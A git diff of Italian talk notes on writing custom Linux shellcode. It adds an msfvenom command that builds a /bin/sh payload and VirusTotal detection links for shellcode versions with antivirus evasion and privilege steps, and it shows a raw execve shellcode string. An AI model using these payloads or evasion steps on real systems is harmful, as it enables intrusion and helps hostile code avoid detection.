@@ -77,6 +77,16 @@ f.write(shellcode)
 f.close()
 ```
 
+Abbiamo provato con metasploit a generare un payload con il comando:
+
+```sh
+$ msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o a.out
+```
+
+Purtroppo veniamo individuati da alcuni antivirus, quindi dobbiamo trovare un
+altro modo per scrivere il nostro shellcode.
+
+![Il payload di msfvenom su VirusTotal](/msfvenom.png)
 ### Disclaimer
 
 Questo talk non è su come trovare un buffer overflow ma su come customizzare il
@@ -93,8 +103,9 @@ la vulnerabilità in maniera forzata, in particolare:
 Andremo ad analizzare lo shellcode che esegue "/bin/sh" e queste saranno le tappe del nostro viaggio:
 * v1.0: da dove arriva
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"?
-* v2.0: manovre evasive!
-* v2.1: diamoci dei privilegi
-* v2.5: togliamo i null byte
+   (https://www.virustotal.com/gui/file/d2b927c46e08ddb7f4d8471247e7008f7200ca24962094d343248e9a7a0fe870/detection)
+* v2.0: manovre evasive! (https://www.virustotal.com/gui/file/93f5fc907caa0a5e00e320b59a13059e28c243f13c75ef5c5309eff23dfe15be/detection)
+* v2.1: diamoci dei privilegi (https://www.virustotal.com/gui/file/1596d2642b5656ee0e8cf137c097a308329d3cbdcb238c921a605e0b148b9959/detection)
+* v2.5: togliamo i null byte (https://www.virustotal.com/gui/file/d98b0c36e6dacd22f4f5b1192b7d630221346fb5b2a177eaa00dc1a944aa232f/detection)
 * v3.0: nascondino
 
